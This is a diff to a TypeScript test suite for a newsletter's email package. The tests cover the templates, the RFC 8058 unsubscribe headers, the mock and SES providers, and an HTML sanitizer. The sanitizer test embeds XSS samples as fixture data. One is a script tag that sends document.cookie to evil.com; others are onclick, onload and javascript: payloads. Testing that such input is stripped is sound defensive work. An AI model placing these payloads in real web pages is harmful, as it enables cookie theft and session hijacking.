@@ -1,64 +1,101 @@
+import { describe, it, expect } from "bun:test";
 import {
   renderConfirmationEmail,
   renderWelcomeEmail,
   renderNewsletterEmail,
-  renderEmailLayout,
   ConsoleMockEmailProvider,
+  SesEmailProvider,
+  sanitizeNewsletterHtml,
 } from "../../packages/email/src/index";
 
-export async function testEmailIntegration() {
-  console.log("▶ [INTEGRATION TEST] Testing Email Templates & Provider Dispatch...");
-
+describe("Email Rendering, Sanitization & Provider Abstractions", () => {
   const provider = new ConsoleMockEmailProvider();
 
-  // 1. Confirmation Template
-  const confirm = renderConfirmationEmail({
-    email: "reader@aisignal.dev",
-    confirmUrl: "https://aisignal.dev/confirm?token=dummy_test_token",
-  });
-  if (!confirm.html.includes("Confirm Subscription") || !confirm.text.includes("dummy_test_token")) {
-    throw new Error("Confirmation email template rendered invalid content");
-  }
+  it("renders double opt-in confirmation email correctly", () => {
+    const confirm = renderConfirmationEmail({
+      email: "reader@aisignal.dev",
+      confirmUrl: "https://aisignal.dev/confirm?token=dummy_test_token",
+    });
 
-  // 2. Welcome Template
-  const welcome = renderWelcomeEmail({
-    email: "reader@aisignal.dev",
-    unsubscribeUrl: "https://aisignal.dev/unsubscribe?token=dummy_unsub_token",
-  });
-  if (!welcome.html.includes("Welcome to AI Signal") || !welcome.html.includes("dummy_unsub_token")) {
-    throw new Error("Welcome email template rendered invalid content");
-  }
-
-  // 3. Weekly Newsletter & RFC Headers
-  const issue = renderNewsletterEmail({
-    issueNumber: 1,
-    issueDate: "October 17, 2026",
-    title: "Frontier Reasoning & Inference Scaling",
-    previewText: "Test-time compute analysis",
-    htmlContent: "<h2>Three Developments</h2>",
-    recipientEmail: "reader@aisignal.dev",
-    unsubscribeUrl: "https://aisignal.dev/unsubscribe?token=unsub_token",
-    archiveUrl: "https://aisignal.dev/archive/1",
+    expect(confirm.html).toContain("Confirm Subscription");
+    expect(confirm.text).toContain("dummy_test_token");
   });
 
-  if (!issue.headers["List-Unsubscribe"] || issue.headers["List-Unsubscribe-Post"] !== "List-Unsubscribe=One-Click") {
-    throw new Error("RFC 8058 List-Unsubscribe headers missing");
-  }
+  it("renders welcome email with clear unsubscribe options", () => {
+    const welcome = renderWelcomeEmail({
+      email: "reader@aisignal.dev",
+      unsubscribeUrl: "https://aisignal.dev/unsubscribe?token=dummy_unsub_token",
+    });
 
-  // 4. Dispatch via Mock Provider
-  const result = await provider.sendEmail({
-    to: "reader@aisignal.dev",
-    subject: "Test Issue Dispatch",
-    html: issue.html,
-    text: issue.text,
-    headers: issue.headers,
+    expect(welcome.html).toContain("Welcome to AI Signal");
+    expect(welcome.html).toContain("dummy_unsub_token");
   });
 
-  if (!result.success || !result.messageId.startsWith("mock_")) {
-    throw new Error("Mock provider dispatch returned failure");
-  }
+  it("generates correct RFC 8058 List-Unsubscribe API endpoint and web body URLs", () => {
+    const issue = renderNewsletterEmail({
+      issueNumber: 1,
+      issueDate: "October 17, 2026",
+      title: "Frontier Reasoning & Inference Scaling",
+      previewText: "Test-time compute analysis",
+      htmlContent: "<h2>Three Developments</h2>",
+      recipientEmail: "reader@aisignal.dev",
+      unsubscribeApiUrl: "https://aisignal.dev/api/unsubscribe?token=api_token_123",
+      unsubscribeWebUrl: "https://aisignal.dev/unsubscribe?token=web_token_123",
+      archiveUrl: "https://aisignal.dev/archive/1",
+    });
 
-  console.log("✔ [INTEGRATION TEST] Email Templates & Provider Dispatch PASSED.");
-}
+    // List-Unsubscribe MUST point to the API endpoint that handles POST
+    expect(issue.headers["List-Unsubscribe"]).toBe("<https://aisignal.dev/api/unsubscribe?token=api_token_123>");
+    expect(issue.headers["List-Unsubscribe-Post"]).toBe("List-Unsubscribe=One-Click");
 
-testEmailIntegration();
+    // Email body must point to the web confirmation page
+    expect(issue.html).toContain("https://aisignal.dev/unsubscribe?token=web_token_123");
+    expect(issue.text).toContain("https://aisignal.dev/unsubscribe?token=web_token_123");
+  });
+
+  it("sanitizes malicious script tags and dangerous event handlers from HTML", () => {
+    const maliciousHtml = `
+      <h2>Frontier Model Breakthrough</h2>
+      <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
+      <p onclick="alert('XSS')">Click for details</p>
+      <a href="javascript:alert('malicious')">Dangerous link</a>
+      <img src="https://aisignal.dev/logo.png" onload="alert('hack')" />
+    `;
+
+    const cleanHtml = sanitizeNewsletterHtml(maliciousHtml);
+
+    expect(cleanHtml).not.toContain("<script>");
+    expect(cleanHtml).not.toContain("onclick");
+    expect(cleanHtml).not.toContain("onload");
+    expect(cleanHtml).not.toContain("javascript:");
+    expect(cleanHtml).toContain("<h2>Frontier Model Breakthrough</h2>");
+    expect(cleanHtml).toContain('src="https://aisignal.dev/logo.png"');
+  });
+
+  it("dispatches emails through console mock provider in development", async () => {
+    const result = await provider.sendEmail({
+      to: "reader@aisignal.dev",
+      subject: "Test Issue Dispatch",
+      html: "<p>Hello</p>",
+      text: "Hello",
+    });
+
+    expect(result.success).toBe(true);
+    expect(result.messageId.startsWith("mock_")).toBe(true);
+    expect(result.provider).toBe("console");
+  });
+
+  it("fails closed in SesEmailProvider when AWS credentials are not configured", async () => {
+    const sesProvider = new SesEmailProvider();
+    const result = await sesProvider.sendEmail({
+      to: "reader@aisignal.dev",
+      subject: "Test SES Dispatch",
+      html: "<p>SES</p>",
+      text: "SES",
+    });
+
+    // Must return false and not mock success
+    expect(result.success).toBe(false);
+    expect(result.error).toContain("AWS_ACCESS_KEY_ID or AWS_SECRET_ACCESS_KEY");
+  });
+});
